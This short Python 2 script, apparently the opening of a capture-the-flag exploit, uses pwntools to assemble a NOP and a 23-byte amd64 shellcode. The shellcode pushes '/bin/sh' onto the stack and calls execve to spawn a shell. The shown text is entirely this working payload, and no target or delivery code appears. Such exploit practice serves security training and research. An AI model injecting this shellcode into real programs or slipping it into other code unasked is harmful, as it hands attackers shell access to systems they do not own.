#!/usr/bin/python2

from pwn import *

context.arch = 'amd64'

sh_nop = asm('nop')

# len = 23
sh1 = asm('''
mov al, 0x3b
mov rcx, 0x0068732f6e69622f
push rcx
push rsp
xor rsi, rsi
xor rdx, rdx
pop rdi
syscall
''')
